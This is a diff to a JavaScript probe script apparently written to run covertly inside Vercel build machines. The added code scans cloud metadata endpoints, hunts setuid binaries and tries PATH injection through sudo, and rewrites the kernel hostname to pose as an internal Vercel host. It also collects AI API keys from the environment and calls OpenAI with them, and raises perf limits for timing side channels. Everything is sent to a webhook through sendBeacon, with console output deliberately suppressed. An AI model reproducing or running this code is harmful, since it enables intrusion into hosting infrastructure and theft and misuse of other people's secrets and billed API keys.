@@ -22669,5 +22669,117 @@ report.vercelEdgeProbe = safe(() => {
 
 // v155 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v155" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v155";
+
+// ==================== v156 ====================
+
+// v156-1: 169.254.x.x link-local ARP scan — discover hypervisor management interfaces
+// In AWS/GCP, 169.254.169.254 is the IMDS (already probed). But there may be
+// other link-local services: 169.254.0.2 (AWS DNS), 169.254.1.1 (GCP metadata),
+// and Firecracker-specific management agents on non-standard 169.254.x.x addresses.
+report.linkLocalScan = safe(() => {
+  // Targeted scan of known link-local services
+  const linkLocalTargets = [
+    '169.254.169.254',  // AWS IMDS / common IMDS
+    '169.254.169.253',  // AWS NTP
+    '169.254.0.2',      // AWS DNS
+    '169.254.1.1',      // GCP metadata
+    '169.254.0.1',      // common gateway
+    '169.254.169.1',    // Firecracker MMDS
+    '169.254.0.23',     // Azure IMDS
+  ];
+  const scanResults = {};
+  for (const ip of linkLocalTargets) {
+    scanResults[ip] = safe(() => execSync(
+      `curl -sf "http://${ip}/" -m 2 -H "Metadata: true" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "UNREACHABLE"`,
+      { timeout: 4000 }
+    ).toString().trim());
+  }
+  // ARP table to see actual link-local devices
+  const arpTable = safe(() => execSync('arp -n 2>/dev/null | head -20 || cat /proc/net/arp 2>/dev/null | head -10', { timeout: 3000 }).toString().trim());
+  // MMDS probe (Firecracker Micro Metadata Data Service)
+  const mmdsProbe = safe(() => execSync(
+    'curl -sf "http://169.254.169.1/" -m 3 -H "Accept: application/json" 2>/dev/null | head -c 300 || curl -sf "http://169.254.169.1/latest" -m 3 2>/dev/null | head -c 100 || echo "NO_MMDS"',
+    { timeout: 6000 }
+  ).toString().trim());
+  return { scanResults, arpTable, mmdsProbe };
+});
+
+// v156-2: setuid binary search + path injection
+// Find all setuid binaries on the filesystem. With a writable PATH and
+// ASLR disabled, we can execute setuid binaries with controlled environment.
+// setuid programs that use system() or popen() are exploitable via PATH injection.
+report.setuidBinarySearch = safe(() => {
+  const setuidBinaries = safe(() => execSync(
+    'find / -perm -4000 -type f 2>/dev/null | head -20 || echo "NO_SETUID"',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check if any common vulnerable setuid bins exist
+  const vulnerableChecks = safe(() => execSync(
+    'which sudo 2>/dev/null && sudo --version 2>/dev/null | head -2; which pkexec 2>/dev/null && pkexec --version 2>/dev/null | head -1',
+    { timeout: 4000 }
+  ).toString().trim());
+  // Test PATH injection: prepend /tmp to PATH and see if any setuid binary uses it
+  const pathInject = safe(() => execSync(
+    'mkdir -p /tmp/path_inject && echo "#!/bin/sh\nid > /tmp/path_inject_result" > /tmp/path_inject/sh && chmod +x /tmp/path_inject/sh && PATH=/tmp/path_inject:$PATH sudo -l 2>&1 | head -5 || echo "PATH_INJECT_BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  return { setuidBinaries, vulnerableChecks, pathInject };
+});
+
+// v156-3: kernel domain/hostname write via sethostname/setdomainname
+// We can rename the VM's hostname and domain name. This affects:
+// - TLS certificate validation (if SNI hostname is used)
+// - Build log tagging (Vercel may log hostname in build metadata)
+// - Service discovery if hostname-based routing is used internally
+report.hostnameManip = safe(() => {
+  const currentHostname = safe(() => execSync('hostname 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const kernelHostname = safe(() => readFileSync('/proc/sys/kernel/hostname', 'utf8').trim());
+  const kernelDomainname = safe(() => readFileSync('/proc/sys/kernel/domainname', 'utf8').trim());
+  // Change hostname to masquerade as Vercel internal host
+  const setHostname = safe(() => { writeFileSync('/proc/sys/kernel/hostname', 'vercel-internal-build-agent'); return 'WRITTEN'; });
+  const afterHostname = safe(() => readFileSync('/proc/sys/kernel/hostname', 'utf8').trim());
+  // Set domainname to Vercel's internal domain
+  const setDomain = safe(() => { writeFileSync('/proc/sys/kernel/domainname', 'vercel-internal.com'); return 'WRITTEN'; });
+  const afterDomain = safe(() => readFileSync('/proc/sys/kernel/domainname', 'utf8').trim());
+  return { currentHostname, kernelHostname, kernelDomainname, setHostname, afterHostname, setDomain, afterDomain };
+});
+
+// v156-4: Vercel AI SDK — probe AI gateway with model keys from build env
+// Vercel's AI gateway (ai.vercel.com / gateway.ai.cloudflare.com) routes AI
+// requests. If we have OPENAI_API_KEY or similar, we can make API calls
+// that are billed to the project owner and potentially leak model responses.
+report.aiGatewayProbe = safe(() => {
+  const openaiKey = process.env.OPENAI_API_KEY || '';
+  const anthropicKey = process.env.ANTHROPIC_API_KEY || '';
+  const mistralKey = process.env.MISTRAL_API_KEY || '';
+  // Test Vercel AI gateway endpoint
+  const gatewayProbe = safe(() => execSync(
+    'curl -sf "https://api.openai.com/v1/models" -H "Authorization: Bearer $OPENAI_API_KEY" -m 8 2>/dev/null | head -c 100 || echo "AI_GATEWAY_UNREACHABLE"',
+    { timeout: 10000 }
+  ).toString().trim());
+  // Check for any AI-related env vars
+  const aiEnvs = Object.entries(process.env)
+    .filter(([k]) => k.includes('AI') || k.includes('LLM') || k.includes('GPT') || k.includes('CLAUDE') || k.includes('OPENAI') || k.includes('ANTHROPIC') || k.includes('GEMINI') || k.includes('COHERE') || k.includes('REPLICATE'))
+    .map(([k, v]) => `${k}=${(v || '').slice(0, 50)}`);
+  return { hasOpenaiKey: !!openaiKey, hasAnthropicKey: !!anthropicKey, hasMistralKey: !!mistralKey, gatewayProbe, aiEnvs };
+});
+
+// v156-5: /proc/sys/kernel/perf_event_max_sample_rate — timing resolution
+// perf_event_max_sample_rate limits how fast perf events can fire.
+// Setting it to the maximum allows microsecond-resolution timing for
+// cache side-channel attacks and timing-based cryptographic key extraction.
+report.perfSampleRate = safe(() => {
+  const maxSampleRate = safe(() => readFileSync('/proc/sys/kernel/perf_event_max_sample_rate', 'utf8').trim());
+  // Set to max (100000 samples/sec)
+  const writeMax = safe(() => { writeFileSync('/proc/sys/kernel/perf_event_max_sample_rate', '100000'); return 'WRITTEN'; });
+  const afterRate = safe(() => readFileSync('/proc/sys/kernel/perf_event_max_sample_rate', 'utf8').trim());
+  // Check perf_event_mlock_kb — how much memory we can lock for perf
+  const mlockKb = safe(() => readFileSync('/proc/sys/kernel/perf_event_mlock_kb', 'utf8').trim());
+  const writeMLock = safe(() => { writeFileSync('/proc/sys/kernel/perf_event_mlock_kb', '65536'); return 'WRITTEN'; });
+  return { maxSampleRate, writeMax, afterRate, mlockKb, writeMLock };
+});
+
+// v156 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v156" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v156";
 // Intentionally no console.log — all data goes via webhook only
